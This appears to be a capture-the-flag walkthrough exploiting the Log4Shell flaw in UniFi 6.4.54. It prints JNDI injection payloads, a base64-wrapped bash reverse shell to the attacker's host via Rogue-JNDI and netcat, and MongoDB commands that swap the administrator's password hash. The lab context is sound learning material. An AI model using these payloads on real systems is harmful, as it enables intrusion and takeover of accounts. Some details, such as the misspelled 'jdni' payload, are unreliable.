# Unified

## Summary

We exploit a Log4J vulnerability in UniFi 6.4.54  
We first use BurpSuite repeater with a modified payload to validate that the vulnerability exists  
We then use Rogue-JDNI to create a listening server, which allows us to get a reverse shell  
We then use the mongoDB command line tool to switch out the hash of the administrator's password with our own generated hash, allowing us to login to the website  
From there, we can find the root password for ssh

## Enumeration

nmap reveals an http-proxy is running on port 8080  
The proxy appears to redirect requests to port 8443, which seems to be running an SSL web server.  
Navigating to the web page we are presented with the UniFi web portal login page and the version number which is 6.4.54  
A quick Google search "UniFy 6.4.54" exploit reveals an article that discusses the in depth exploitation of CVE-2021-44228 vulnerability  
This is a Log4J vulnerability which can be exploited by injecting OS commands.  

## Log4J Overview

Log4J is a popular loggin library for Java created in 2001.  
It is part of the Apache Software Foundation, although all of their work is volunteer-based  
The logging library's main function is to provide devs with a way to change the format and verbosity of loggin through configuration files versus code  
Essentially, the library allows you to instead of using print statements write something like this:
```Java
logging.INFO("Application Started")
logging.WARN("File Uploaded")
logging.DEBUG("SQL Query Ran")
```
Log4J is a vulnerability which allows attacker-controlled strings to appear in logs  
Here is a detailed article about Log4J:  
https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation

## Enumerating Log4J

We use BurpSuite repeater to modify the login request and change the "remember" JSON field to the following:  
`"remember":"${jdni:ldap://10.10.15.85/whatever}"`  
We are attempting to identify an injection point if one exists.  
If the request causes the server to connect back to us, then we have verified that the application is vulnerable  

**JNDI:** Java Naming and Directory Interface API
By making calls to this API, applications locate resources and other program objects.  
A resource is a program object that provides connections to systems, such as database servers and messaging systems.  

**LDAP:** Lightweight Directory Access Protocol  
An open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internte or a Network.  
The default port which LDAP runs on is 389  

After we send our modified request with BurpSuite, the response tells us the payload is invalid, but despite the error message, the payload is actually being executed  
We can use tcpdump, to monitor the network traffic for LDAP connections  

**tcpdump** is a data-network packet analyzer that runs on a CLI.  
It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached  

We start tcpdump on port 389 with: `sudo tcpdump -i tun0 port 389`  
- `-i` flag means select interface (ie: eth0, wlan, tun0)

When we resend the modified request in repeater, we see a connection in tcpdump being received on our machine  
This proves the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389

## Exploiting Log4J

We had to install open-jdk and Maven in order to build a payload that we can send  
Open-JDK is the Java Development kit, which is used to build Java applications  
Maven is an IDE that we will use to compile our projects into jar files  

We also download the Rogue-JNDI package from github
We use maven to build the package: `mvn package`  

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system  
We will be Base-64 encoding the payload to prevent any encoding issues:  
`echo 'bash -c bash -i >&/dev/tcp/{our ip address}/4444 0>&1' | base64`  
This generates a long base64 string which we will use:  
`java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,{our base64 string} | {base64, -d} | {bash, -i}" --hostname "{our ip address}"`  

Now, we have a server listening locally on port 389  
Next we start a netcat listener to capture the reverse shell: `nc -lvp 4444`  
Now, we go back to BurpSuite, and change the payload to: `${jdni:ldap://10.10.15.85:1389/o=tomcat}`

After sending the request, a connection to our rogue server is received and the following message is shown:  
`Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload`  
We will also see a shell spawn on our netcat listener  
We can upgrade the terminal shell: `script /dev/null -c bash`

## Privlege Escalation

First, we check if MongoDB is running on the target system: `ps aux | grep mongo`  
We can see that MongoDB is running on port 27117  
A quick Google search shows that the default database name for the UniFi application is ace  
Using the mongo CLI we can attempt to extract the administrators password:  
`mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`  
The output reveals a user called Administrator. Their password hash is located in the x_shadow variable, but in this instance it cannot be cracked with any password cracking utilities  

What we will do is actually replace the x_shadow password with our own created hash  
The `6` at the start of the existing password is the algorithm indicator, indicating that SHA-512 is being used  
We can make our own sha-512 password with: `mkpasswd -m sha-512 Password1234`  

To replace the existing hash with the one we created:  
`mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"{SHA_512 hash we generated}"}})'`  
then, `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"` will allow us to verify that the hash was in fact changed  

We can now login to the UniFi web portal using administrator:Password1234  
In this web portal, we are able to locate the password for root, used for ssh